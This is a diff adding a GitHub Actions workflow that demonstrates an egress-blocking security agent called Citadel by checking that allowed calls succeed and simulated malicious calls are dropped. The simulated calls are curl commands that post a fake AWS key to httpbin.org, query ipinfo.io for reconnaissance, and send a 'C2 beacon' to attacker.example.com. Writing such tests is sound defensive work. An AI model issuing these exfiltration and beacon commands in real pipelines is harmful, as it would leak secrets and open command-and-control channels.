@@ -1,0 +1,97 @@
+name: attack
+# Citadel block-mode demo.
+#
+# This workflow simulates a build pipeline that contains both legitimate
+# traffic (which should succeed) and would-be-malicious traffic (which the
+# Citadel agent's cgroup_skb/egress eBPF program should drop at the kernel).
+#
+# Expected outcome with the matching block policy installed:
+#   ✅ github.com / api.github.com / registry.npmjs.org : SUCCEED (allowlisted)
+#   ⛔ httpbin.org / ipinfo.io / attacker.example.com    : BLOCKED (connection refused)
+#
+# The "BLOCKED" calls don't fail the job — we use `|| true` and report
+# success/failure inline so the dashboard's allowed-vs-blocked counts are
+# what really tells the story.
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/attack.yml'
+
+jobs:
+  attack:
+    runs-on: [self-hosted, linux, citadel-runner]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Citadel (BLOCK mode)
+        uses: Mahesh-Kete/monorepo/action@main
+        with:
+          mode: block       # ← actually drop disallowed egress at the kernel
+          backend-url: http://localhost:8080
+          image-tag: dev
+          watch-path: ${{ github.workspace }}
+
+      # ─────────────────────────────────────────────────────────────────
+      # 1) Allowed calls — these should SUCCEED.
+      # ─────────────────────────────────────────────────────────────────
+      - name: Allowed — api.github.com
+        run: |
+          citadel-step "allowed: github api"
+          if curl -sS --max-time 5 https://api.github.com/zen; then
+            echo "✅ api.github.com reached (expected)"
+          else
+            echo "⚠️  api.github.com unexpectedly blocked"
+            exit 1
+          fi
+
+      - name: Allowed — registry.npmjs.org
+        run: |
+          citadel-step "allowed: npm search"
+          if curl -sS --max-time 5 "https://registry.npmjs.org/-/v1/search?text=react&size=1" > /dev/null; then
+            echo "✅ npm registry reached (expected)"
+          else
+            echo "⚠️  npm registry unexpectedly blocked"
+            exit 1
+          fi
+
+      # ─────────────────────────────────────────────────────────────────
+      # 2) Would-be-malicious calls — these should be BLOCKED.
+      # ─────────────────────────────────────────────────────────────────
+      - name: Blocked — httpbin.org (not allowlisted)
+        run: |
+          citadel-step "blocked: httpbin exfil"
+          if curl -sS --max-time 5 https://httpbin.org/post -d "fake_token=AKIAFAKEKEY" 2>&1; then
+            echo "❌ httpbin.org was NOT blocked — policy is wrong or agent is in audit mode"
+          else
+            echo "✅ httpbin.org BLOCKED at kernel (expected)"
+          fi
+
+      - name: Blocked — ipinfo.io (recon)
+        run: |
+          citadel-step "blocked: ipinfo recon"
+          if curl -sS --max-time 5 https://ipinfo.io/json 2>&1; then
+            echo "❌ ipinfo.io was NOT blocked"
+          else
+            echo "✅ ipinfo.io BLOCKED at kernel (expected)"
+          fi
+
+      - name: Blocked — attacker.example.com (C2)
+        run: |
+          citadel-step "blocked: c2 callback"
+          if curl -sS --max-time 5 http://attacker.example.com/beacon 2>&1; then
+            echo "❌ attacker.example.com was NOT blocked"
+          else
+            echo "✅ attacker.example.com BLOCKED (expected — DNS fail or kernel drop)"
+          fi
+
+      # ─────────────────────────────────────────────────────────────────
+      # 3) Process/file activity for the other probes.
+      # ─────────────────────────────────────────────────────────────────
+      - name: Process + file events
+        run: |
+          citadel-step "proc + file activity"
+          echo "tampered" > ${GITHUB_WORKSPACE}/note.txt
+          uname -a
+          python3 -c "print('hello from python')"
